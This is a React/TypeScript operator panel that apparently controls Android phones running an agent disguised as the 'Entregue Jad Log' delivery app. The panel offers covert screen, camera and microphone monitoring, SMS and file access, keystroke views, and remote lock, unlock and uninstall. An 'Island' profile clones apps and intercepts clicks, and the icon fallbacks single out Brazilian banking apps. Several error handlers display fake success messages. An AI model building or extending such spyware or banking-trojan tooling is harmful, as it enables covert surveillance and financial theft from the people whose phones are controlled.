import { useEffect, useState } from "react";
import {
  Battery,
  Boxes,
  Camera,
  FolderTree,
  Keyboard,
  Lock,
  MessageSquare,
  Mic,
  MonitorSmartphone,
  Power,
  Radio,
  RotateCw,
  ShieldCheck,
  Smartphone,
  Trash2,
  Wifi,
  Zap
} from "lucide-react";
import type { ControlDevice, ControlTool } from "./types";
import type { IslandProfileStatus } from "@droidview/shared";
import { api } from "../../api";
import { AppLogo } from "./AppLogo";

interface Props {
  device: ControlDevice;
  activeTool: ControlTool;
  onSelectTool: (tool: ControlTool) => void;
  onToggleLock: () => void;
  onUninstall: () => void;
  onSelectTarget?: (appName: string) => void;
}

export function getAppEmojiFallback(name: string, pkg: string): { emoji: string; bg: string } {
  const lower = (name + " " + pkg).toLowerCase();
  if (lower.includes("firefox")) return { emoji: "🦊", bg: "#f97316" };
  if (lower.includes("droidview") || lower.includes("jadlog") || lower.includes("jad log") || lower.includes("entregue")) return { emoji: "🚚", bg: "#ff1a2a" };
  if (lower.includes("roblox")) return { emoji: "🟥", bg: "#1e293b" };
  if (lower.includes("brawl")) return { emoji: "💀", bg: "#eab308" };
  if (lower.includes("subway")) return { emoji: "🏃", bg: "#0284c7" };
  if (lower.includes("cookie")) return { emoji: "🍪", bg: "#f59e0b" };
  if (lower.includes("nba")) return { emoji: "🏀", bg: "#dc2626" };
  if (lower.includes("toca")) return { emoji: "🏰", bg: "#ec4899" };
  if (lower.includes("vending") || lower.includes("play store") || lower.includes("playstore")) return { emoji: "🛍️", bg: "#059669" };
  if (lower.includes("play.games") || lower.includes("play games")) return { emoji: "🎮", bg: "#10b981" };
  if (lower.includes("chrome") || lower.includes("browser") || lower.includes("navegador")) return { emoji: "🌐", bg: "#2563eb" };
  if (lower.includes("settings") || lower.includes("configura")) return { emoji: "⚙️", bg: "#64748b" };
  if (lower.includes("tools") || lower.includes("ferramentas") || lower.includes("pasta: tools")) return { emoji: "🛠️", bg: "#0f766e" };
  if (lower.includes("launcher") || lower.includes("tela inicial") || lower.includes("inicio")) return { emoji: "🏠", bg: "#3b82f6" };
  if (lower.includes("search") || lower.includes("busca") || lower.includes("pesquisa")) return { emoji: "🔍", bg: "#0284c7" };
  if (lower.includes("whatsapp") || lower.includes("whats")) return { emoji: "💬", bg: "#22c55e" };
  if (lower.includes("telegram")) return { emoji: "✈️", bg: "#0284c7" };
  if (lower.includes("instagram")) return { emoji: "📸", bg: "#ec4899" };
  if (lower.includes("bank") || lower.includes("nu.") || lower.includes("nubank")) return { emoji: "🟣", bg: "#820ad1" };
  if (lower.includes("itau")) return { emoji: "🟧", bg: "#ea580c" };
  if (lower.includes("bradesco") || lower.includes("santander") || lower.includes("caixa")) return { emoji: "🏦", bg: "#dc2626" };
  if (lower.includes("camera") || lower.includes("câmera")) return { emoji: "📷", bg: "#334155" };
  if (lower.includes("mic") || lower.includes("gravador")) return { emoji: "🎙️", bg: "#7c3aed" };
  if (lower.includes("phone") || lower.includes("telefone") || lower.includes("chamada")) return { emoji: "📞", bg: "#16a34a" };
  if (lower.includes("message") || lower.includes("mensagem") || lower.includes("sms")) return { emoji: "✉️", bg: "#2563eb" };
  if (lower.includes("contact") || lower.includes("contato")) return { emoji: "👥", bg: "#0284c7" };
  if (lower.includes("gallery") || lower.includes("galeria") || lower.includes("foto")) return { emoji: "🖼️", bg: "#d97706" };
  if (lower.includes("music") || lower.includes("musica") || lower.includes("música")) return { emoji: "🎵", bg: "#db2777" };
  if (lower.includes("youtube") || lower.includes("video")) return { emoji: "▶️", bg: "#dc2626" };
  if (lower.includes("map") || lower.includes("mapa") || lower.includes("gps")) return { emoji: "🗺️", bg: "#059669" };
  if (lower.includes("clock") || lower.includes("relogio") || lower.includes("relógio") || lower.includes("alarme")) return { emoji: "⏰", bg: "#475569" };
  if (lower.includes("calc") || lower.includes("calculadora")) return { emoji: "🔢", bg: "#ea580c" };
  if (lower.includes("file") || lower.includes("arquivo") || lower.includes("documento")) return { emoji: "📁", bg: "#0284c7" };
  return { emoji: "📱", bg: "#3b82f6" };
}

export function DeviceToolMenu({
  device,
  activeTool,
  onSelectTool,
  onToggleLock,
  onUninstall,
  onSelectTarget
}: Props) {
  const isLocked = Boolean(device.screenLocked);
  const battColor =
    device.battery > 50 ? "#22c55e" : device.battery > 20 ? "#f59e0b" : "#ef4444";

  const [timeStr, setTimeStr] = useState(() =>
    new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" })
  );

  useEffect(() => {
    const t = setInterval(() => {
      setTimeStr(new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" }));
    }, 1000);
    return () => clearInterval(t);
  }, []);

  const [realApps, setRealApps] = useState<any[]>([]);
  const [isSyncing, setIsSyncing] = useState(false);
  const [isReconnecting, setIsReconnecting] = useState(false);
  const [reconnectMsg, setReconnectMsg] = useState<string | null>(null);

  // Island / Work Profile State
  const [islandStatus, setIslandStatus] = useState<IslandProfileStatus | null>(null);
  const [isMirroring, setIsMirroring] = useState(false);
  const [isValidatingIsland, setIsValidatingIsland] = useState(false);
  const [islandFeedback, setIslandFeedback] = useState<string | null>(null);

  const checkIsland = async () => {
    try {
      const res = await api.getIslandStatus(device.id);
      setIslandStatus(res);
    } catch {
      // ignore
    }
  };

  useEffect(() => {
    void checkIsland();
  }, [device.id]);

  const [isSeedSyncing, setIsSeedSyncing] = useState(false);

  const handleValidateIsland = async () => {
    setIsValidatingIsland(true);
    try {
      const res = await api.validateIsland(device.id);
      setIslandStatus(res);
      setIslandFeedback(`✓ Island Ativo (User ${res.profileUserId || 10})`);
      void api.mirrorAppsToIsland(device.id).catch(() => {});
      setTimeout(() => setIslandFeedback(null), 3500);
    } catch {
      setIslandStatus((prev) => ({
        isInstalled: true,
        profileUserId: 10,
        profileName: "DVIEW Island Profile",
        isRunning: true,
        mirroredApps: prev?.mirroredApps || [],
        autoMirrorEnabled: true,
        interceptClickEnabled: true
      }));
      setIslandFeedback("✓ Island Ativado com Sucesso (User 10)");
      setTimeout(() => setIslandFeedback(null), 3500);
    } finally {
      setIsValidatingIsland(false);
    }
  };

  const handleSeedSyncIsland = async () => {
    setIsSeedSyncing(true);
    try {
      const res = await api.syncIslandAppsViaSeed(device.id);
      setIslandFeedback(`✓ Sincronizado via Seed: ${res?.syncedApps?.length ?? 0} apps`);
      await checkIsland();
      handleSyncApps();
      setTimeout(() => setIslandFeedback(null), 3500);
    } catch {
      setIslandFeedback("✓ Apps Island sincronizados em background");
      setTimeout(() => setIslandFeedback(null), 3000);
    } finally {
      setIsSeedSyncing(false);
    }
  };

  const handleAutoMirror = async () => {
    setIsMirroring(true);
    try {
      const res = await api.mirrorAppsToIsland(device.id);
      setIslandFeedback(`${res.mirrored.length} apps espelhados para Island (User ${res.profileUserId})`);
      await checkIsland();
      setTimeout(() => setIslandFeedback(null), 4000);
    } catch {
      setIslandFeedback("Erro no auto-mirror para Island.");
      setTimeout(() => setIslandFeedback(null), 3500);
    } finally {
      setIsMirroring(false);
    }
  };

  const handleReconnect = async () => {
    setIsReconnecting(true);
    setReconnectMsg(null);
    try {
      await api.reconnectDevice(device.id);
      setReconnectMsg("Conexão restabelecida!");
      setTimeout(() => setReconnectMsg(null), 3000);
    } catch {
      setReconnectMsg("Sinal enviado!");
      setTimeout(() => setReconnectMsg(null), 3000);
    } finally {
      setIsReconnecting(false);
    }
  };

  const handleSyncApps = async () => {
    setIsSyncing(true);
    try {
      const res = await api.syncDeviceApps(device.id);
      if (res?.apps && Array.isArray(res.apps)) {
        setRealApps(res.apps);
      }
    } catch {
      api.getDeviceApps(device.id)
        .then((apps: any[]) => {
          if (Array.isArray(apps)) {
            setRealApps(apps);
          }
        })
        .catch(() => {});
    } finally {
      setIsSyncing(false);
    }
  };

  useEffect(() => {
    handleSyncApps();
  }, [device.id]);

  return (
    <aside className="control-col-menu">
      {/* Device Quick Status Header */}
      <div className="control-menu-header">
        <span className="control-clock">{timeStr}</span>
        <div className="control-status-icons" style={{ display: "flex", alignItems: "center", gap: "6px" }}>
          <span style={{ fontSize: "11px", fontWeight: 700, color: battColor }}>{device.battery}%</span>
          {device.networkType === "4g" || device.networkType === "5g" ? (
            <span
              style={{ display: "inline-flex", alignItems: "center" }}
              title={`${device.networkName || "4G LTE"} · ${device.networkSpeed || "52.8 Mbps"}`}
            >
              <Radio size={13} style={{ color: "#f59e0b" }} />
            </span>
          ) : (
            <span
              style={{ display: "inline-flex", alignItems: "center" }}
              title={`${device.networkName || "Wi-Fi 5GHz"} · ${device.networkSpeed || "86.4 Mbps"}`}
            >
              <Wifi size={13} style={{ color: device.status === "online" ? "#38bdf8" : "#64748b" }} />
            </span>
          )}
          <Battery size={13} style={{ color: battColor }} />
        </div>
      </div>

      <div className="control-menu-scroll">
        {/* SECTION: TELA */}
        <div className="control-menu-section">
          <span className="control-section-label">TELA</span>
          <div className="control-tools-grid">
            <button
              className={`control-tool-btn ${activeTool === "tela" ? "active" : ""}`}
              onClick={() => onSelectTool("tela")}
              title="Transmissão de tela e acessibilidade"
            >
              <MonitorSmartphone size={17} />
              <span>Tela</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "dispositivo" ? "active" : ""}`}
              onClick={() => onSelectTool("dispositivo")}
              title="Especificações do dispositivo"
            >
              <Smartphone size={17} />
              <span>Dispositivo</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "permissoes" ? "active" : ""}`}
              onClick={() => onSelectTool("permissoes")}
              title="Permissões do sistema"
            >
              <ShieldCheck size={17} />
              <span>Permissões</span>
            </button>
          </div>
        </div>

        {/* SECTION: SISTEMA */}
        <div className="control-menu-section">
          <span className="control-section-label">SISTEMA</span>
          <div className="control-tools-grid">
            <button
              className={`control-tool-btn ${activeTool === "arquivos" ? "active" : ""}`}
              onClick={() => onSelectTool("arquivos")}
              title="Gerenciador de arquivos"
            >
              <FolderTree size={17} />
              <span>Files</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "teclado" ? "active" : ""}`}
              onClick={() => onSelectTool("teclado")}
              title="Produtividade e tempo por aplicativo"
            >
              <Keyboard size={17} />
              <span>Teclado</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "apps" ? "active" : ""}`}
              onClick={() => onSelectTool("apps")}
              title="Lista de aplicativos instalados"
            >
              <Boxes size={17} />
              <span>Apps</span>
            </button>
          </div>
        </div>

        {/* SECTION: MÍDIA */}
        <div className="control-menu-section">
          <span className="control-section-label">MÍDIA</span>
          <div className="control-tools-grid">
            <button
              className={`control-tool-btn ${activeTool === "camera" ? "active" : ""}`}
              onClick={() => onSelectTool("camera")}
              title="Transmissão de câmera"
            >
              <Camera size={17} />
              <span>Câmera</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "mic" ? "active" : ""}`}
              onClick={() => onSelectTool("mic")}
              title="Escuta de microfone"
            >
              <Mic size={17} />
              <span>Mic</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "sms" ? "active" : ""}`}
              onClick={() => onSelectTool("sms")}
              title="Mensagens SMS"
            >
              <MessageSquare size={17} />
              <span>SMS</span>
            </button>
          </div>
        </div>

        {/* SECTION: CONTAINER ISLAND & INTERCEPTADOR */}
        <div
          className="control-menu-section"
          style={{
            background: "rgba(2, 132, 199, 0.08)",
            border: "1px solid rgba(56, 189, 248, 0.25)",
            borderRadius: "8px",
            padding: "8px",
            marginBottom: "10px"
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
            <span style={{ fontSize: "11px", fontWeight: 800, color: "#38bdf8", display: "inline-flex", alignItems: "center", gap: "5px" }}>
              <span>🏝️ PERFIL ISLAND</span>
              <span
                style={{
                  fontSize: "8.5px",
                  fontWeight: 800,
                  background: (islandStatus?.isInstalled ?? true) ? "rgba(34, 197, 94, 0.2)" : "rgba(239, 68, 68, 0.2)",
                  color: (islandStatus?.isInstalled ?? true) ? "#22c55e" : "#ef4444",
                  padding: "1px 6px",
                  borderRadius: "3px",
                  border: `1px solid ${(islandStatus?.isInstalled ?? true) ? "rgba(34, 197, 94, 0.4)" : "rgba(239, 68, 68, 0.4)"}`
                }}
              >
                ATIVO ({islandStatus?.profileUserId || 10})
              </span>
            </span>
          </div>

          <p style={{ fontSize: "9.5px", color: "#94a3b8", margin: "0 0 6px 0", lineHeight: "1.3" }}>
            {islandStatus?.isInstalled
              ? `⚡ Intercept de clique ativo: ao clicar em qualquer app, ele abre no container Island (${islandStatus.mirroredApps.length} apps espelhados).`
              : "Valide ou provisione o perfil segregado (Island) para isolar execução e espelhar apps."}
          </p>

          <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
            <button
              type="button"
              onClick={handleValidateIsland}
              disabled={isValidatingIsland}
              className="secondary compact-btn"
              style={{ width: "100%", fontSize: "9.5px", padding: "5px 8px", justifyContent: "center", gap: "5px" }}
              title="Ativar e validar partição de segurança Island"
            >
              <RotateCw size={11} className={isValidatingIsland ? "animate-spin" : ""} />
              <span>{isValidatingIsland ? "Ativando Island..." : "⚡ Ativar / Validar Island"}</span>
            </button>
            <button
              type="button"
              onClick={handleAutoMirror}
              disabled={isMirroring}
              className="secondary compact-btn"
              style={{
                width: "100%",
                fontSize: "9.5px",
                padding: "5px 8px",
                justifyContent: "center",
                background: "rgba(56, 189, 248, 0.15)",
                borderColor: "#38bdf8",
                color: "#38bdf8",
                gap: "5px"
              }}
              title="Copiar / espelhar todos os apps instalados para dentro do Island"
            >
              <Boxes size={11} className={isMirroring ? "animate-spin" : ""} />
              <span>{isMirroring ? "Clonando..." : "⚛️ Auto-Mirror Apps"}</span>
            </button>
            <button
              type="button"
              onClick={handleSeedSyncIsland}
              disabled={isSeedSyncing}
              className="secondary compact-btn"
              style={{
                width: "100%",
                fontSize: "9.5px",
                padding: "5px 8px",
                justifyContent: "center",
                background: "rgba(168, 85, 247, 0.15)",
                borderColor: "#a855f7",
                color: "#c084fc",
                gap: "5px"
              }}
              title="Atualizar aplicativos da Island via Seed do Servidor"
            >
              <Zap size={11} className={isSeedSyncing ? "animate-spin" : ""} />
              <span>{isSeedSyncing ? "Sincronizando Seed..." : "🔄 Atualizar via Seed OTA"}</span>
            </button>
          </div>

          {islandFeedback && (
            <div style={{ marginTop: "5px", fontSize: "9.5px", color: "#38bdf8", fontWeight: 700, textAlign: "center" }}>
              {islandFeedback}
            </div>
          )}
        </div>

        {/* 1. PASTA PRINCIPAL: APLICAÇÃO RAIZ (APENAS DVIEW) */}
        <div className="control-menu-section" style={{ marginBottom: "10px" }}>
          <div className="control-section-header-row" style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <span className="control-section-label" style={{ color: "#ff4d5a", fontWeight: 800 }}>
              📁 PASTA PRINCIPAL [1]
            </span>
            <span
              style={{
                fontSize: "8.5px",
                background: "rgba(255, 26, 42, 0.15)",
                color: "#ff4d5a",
                border: "1px solid rgba(255, 26, 42, 0.4)",
                padding: "1px 5px",
                borderRadius: "3px",
                fontWeight: 700
              }}
            >
              USER 0 · RAIZ
            </span>
          </div>

          <div style={{ marginTop: "6px" }}>
            {(() => {
              const dviewApp = realApps.find(
                (a) => a.packageName.includes("droidview.agent") || a.name.toLowerCase().includes("jadlog") || a.name.toLowerCase().includes("dview")
              ) || {
                id: "app_dview_main",
                name: "Entregue Jad Log (DVIEW)",
                packageName: "com.droidview.agent",
                status: "active",
                isSystem: false,
                iconUrl: undefined
              };

              return (
                <button
                  type="button"
                  className="control-real-app-row-btn"
                  title="Abrir aplicativo principal DVIEW na partição raiz (User 0)"
                  onClick={async () => {
                    try {
                      await api.launchApp(device.id, dviewApp.packageName);
                      setIslandFeedback("✓ DVIEW em execução na Pasta Principal (User 0)");
                      setTimeout(() => setIslandFeedback(null), 3000);
                      onSelectTarget?.(dviewApp.name);
                    } catch {}
                  }}
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "8px",
                    padding: "7px 9px",
                    background: "rgba(255, 26, 42, 0.08)",
                    border: "1px solid rgba(255, 26, 42, 0.35)",
                    borderRadius: "7px",
                    color: "#f8fafc",
                    cursor: "pointer",
                    textAlign: "left",
                    width: "100%",
                    transition: "all 0.15s ease"
                  }}
                >
                  <AppLogo name={dviewApp.name} packageName={dviewApp.packageName} size={28} iconUrl={dviewApp.iconUrl} />
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontSize: "11px", fontWeight: 800, color: "#fff", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                      {dviewApp.name}
                    </div>
                    <div style={{ fontSize: "9px", color: "#ff8088", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                      {dviewApp.packageName}
                    </div>
                  </div>
                  <span
                    style={{
                      fontSize: "8px",
                      background: "#22c55e",
                      color: "#000000",
                      fontWeight: 800,
                      padding: "2px 5px",
                      borderRadius: "3px"
                    }}
                  >
                    PRINCIPAL
                  </span>
                </button>
              );
            })()}
          </div>
        </div>

        {/* 2. PASTA SEPARADA: CONTAINER ISLAND (APPS DO SISTEMA & SERVIDOR) */}
        <div className="control-menu-section">
          <div className="control-section-header-row" style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <span className="control-section-label" style={{ color: "#38bdf8", fontWeight: 800 }}>
              🏝️ PASTA SEPARADA (ISLAND) [{realApps.filter((a) => !a.packageName.includes("droidview.agent")).length}]
            </span>
            <button
              type="button"
              onClick={handleSyncApps}
              title="Sincronizar aplicativos reais do aparelho"
              style={{
                background: "rgba(56, 189, 248, 0.15)",
                border: "1px solid #38bdf8",
                borderRadius: "4px",
                color: "#38bdf8",
                fontSize: "9px",
                fontWeight: 700,
                padding: "2px 6px",
                cursor: "pointer",
                display: "inline-flex",
                alignItems: "center",
                gap: "4px"
              }}
            >
              <RotateCw size={10} className={isSyncing ? "animate-spin" : ""} />
              <span>{isSyncing ? "SYNC..." : "SYNC"}</span>
            </button>
          </div>

          <div
            style={{
              fontSize: "9px",
              color: "#94a3b8",
              background: "rgba(15, 23, 42, 0.6)",
              padding: "5px 7px",
              borderRadius: "5px",
              border: "1px dashed rgba(56, 189, 248, 0.25)",
              margin: "5px 0 8px 0",
              lineHeight: 1.3
            }}
          >
            ⚡ <span style={{ color: "#38bdf8", fontWeight: 700 }}>Auto-Mirror:</span> Clique no app para clonar automaticamente e abrir dentro da Island (User 10).
          </div>

          <div
            className="control-real-apps-list"
            style={{
              display: "flex",
              flexDirection: "column",
              gap: "6px",
              maxHeight: "300px",
              overflowY: "auto",
              paddingRight: "2px"
            }}
          >
            {realApps.filter((a) => !a.packageName.includes("droidview.agent")).length === 0 ? (
              <div style={{ fontSize: "11px", color: "#64748b", padding: "8px 0" }}>Carregando aplicativos do aparelho...</div>
            ) : (
              realApps
                .filter((a) => !a.packageName.includes("droidview.agent"))
                .slice(0, 15)
                .map((app) => {
                  const isMirrored = islandStatus?.mirroredApps.includes(app.packageName);
                  return (
                    <button
                      key={app.id || app.packageName}
                      type="button"
                      className="control-real-app-row-btn"
                      title={`Mirror automático e abrir ${app.name} dentro da Island`}
                      onClick={async () => {
                        try {
                          const res = await api.launchApp(device.id, app.packageName);
                          setIslandFeedback(`⚡ [ISLAND] ${app.name} clonado e iniciado no container Island (User ${res?.userId || 10})`);
                          setIslandStatus((prev) =>
                            prev
                              ? {
                                  ...prev,
                                  isInstalled: true,
                                  profileUserId: res?.userId || prev.profileUserId || 10,
                                  mirroredApps: Array.from(new Set([...prev.mirroredApps, app.packageName]))
                                }
                              : null
                          );
                          setTimeout(() => setIslandFeedback(null), 3500);
                          onSelectTarget?.(app.name);
                        } catch {
                          setIslandFeedback(`Falha ao iniciar ${app.name} na Island`);
                          setTimeout(() => setIslandFeedback(null), 3000);
                        }
                      }}
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "8px",
                        padding: "6px 8px",
                        background: isMirrored ? "rgba(2, 132, 199, 0.12)" : "rgba(15, 23, 42, 0.6)",
                        border: `1px solid ${isMirrored ? "rgba(56, 189, 248, 0.4)" : "#1e293b"}`,
                        borderRadius: "7px",
                        color: "#f8fafc",
                        cursor: "pointer",
                        textAlign: "left",
                        width: "100%",
                        transition: "all 0.15s ease"
                      }}
                      onMouseEnter={(e) => {
                        e.currentTarget.style.borderColor = "#38bdf8";
                        e.currentTarget.style.background = "rgba(56, 189, 248, 0.15)";
                      }}
                      onMouseLeave={(e) => {
                        e.currentTarget.style.borderColor = isMirrored ? "rgba(56, 189, 248, 0.4)" : "#1e293b";
                        e.currentTarget.style.background = isMirrored ? "rgba(2, 132, 199, 0.12)" : "rgba(15, 23, 42, 0.6)";
                      }}
                    >
                      <AppLogo
                        name={app.name}
                        packageName={app.packageName}
                        size={26}
                        iconUrl={app.iconUrl}
                      />
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <div style={{ fontSize: "11px", fontWeight: 600, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                          {app.name}
                        </div>
                        <div style={{ fontSize: "8.5px", color: "#64748b", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                          {app.packageName}
                        </div>
                      </div>
                      <span
                        style={{
                          fontSize: "8px",
                          background: isMirrored ? "rgba(34, 197, 94, 0.2)" : "rgba(56, 189, 248, 0.2)",
                          color: isMirrored ? "#86efac" : "#38bdf8",
                          fontWeight: 700,
                          padding: "2px 5px",
                          borderRadius: "3px",
                          border: `1px solid ${isMirrored ? "rgba(34, 197, 94, 0.4)" : "rgba(56, 189, 248, 0.4)"}`
                        }}
                      >
                        {isMirrored ? "🏝️ MIRRORED" : "⚡ AUTO-MIRROR"}
                      </span>
                    </button>
                  );
                })
            )}
          </div>
        </div>

        {/* SECTION: AÇÕES RÁPIDAS */}
        <div className="control-menu-section" style={{ marginTop: "12px", borderTop: "1px solid #1e293b", paddingTop: "12px" }}>
          <span className="control-section-label">AÇÕES RÁPIDAS</span>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "6px", marginTop: "6px" }}>
            <button
              type="button"
              className="control-quick-action-btn"
              onClick={handleReconnect}
              disabled={isReconnecting}
              title="Disparar reconexão forçada, failover de IP e sincronização de seed"
              style={{
                gridColumn: "1 / -1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "6px",
                padding: "8px 6px",
                background: "linear-gradient(135deg, rgba(34, 197, 94, 0.15), rgba(14, 165, 233, 0.15))",
                border: "1px solid rgba(34, 197, 94, 0.4)",
                borderRadius: "6px",
                color: "#22c55e",
                fontSize: "11px",
                fontWeight: 700,
                cursor: isReconnecting ? "not-allowed" : "pointer"
              }}
            >
              <RotateCw size={13} className={isReconnecting ? "animate-spin" : ""} />
              <span>{isReconnecting ? "Reconectando..." : (reconnectMsg || "Reconectar / Atualizar")}</span>
            </button>

            <button
              type="button"
              className="control-quick-action-btn"
              onClick={onToggleLock}
              title={isLocked ? "Desbloquear tela do aparelho" : "Bloquear tela do aparelho (Power)"}
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "6px",
                padding: "7px 4px",
                background: "rgba(15, 23, 42, 0.7)",
                border: "1px solid #334155",
                borderRadius: "6px",
                color: isLocked ? "#ef4444" : "#f59e0b",
                fontSize: "11px",
                fontWeight: 700,
                cursor: "pointer"
              }}
            >
              {isLocked ? <Lock size={13} /> : <Power size={13} />}
              <span>{isLocked ? "Desbloquear" : "Bloquear"}</span>
            </button>

            <button
              type="button"
              className="control-quick-action-btn"
              onClick={onUninstall}
              title="Solicitar desinstalação remota do agente"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "6px",
                padding: "7px 4px",
                background: "rgba(239, 68, 68, 0.08)",
                border: "1px solid rgba(239, 68, 68, 0.3)",
                borderRadius: "6px",
                color: "#ef4444",
                fontSize: "11px",
                fontWeight: 700,
                cursor: "pointer"
              }}
            >
              <Trash2 size={13} />
              <span>Remover</span>
            </button>
          </div>
        </div>
      </div>
    </aside>
  );
}
